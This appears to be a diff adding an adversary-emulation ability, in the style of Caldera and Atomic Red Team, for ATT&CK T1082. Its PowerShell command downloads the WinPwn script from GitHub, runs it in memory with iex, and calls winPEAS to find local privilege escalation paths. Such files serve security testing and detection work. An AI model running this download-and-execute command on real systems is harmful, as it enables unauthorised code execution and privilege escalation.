@@ -1,0 +1,19 @@
+- description: Discover Local Privilege Escalation possibilities using winPEAS function
+    of WinPwn
+  id: e6a9fe7e91030f05ad87b75ad4fd4a3a
+  name: WinPwn - winPEAS
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          winPEAS -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
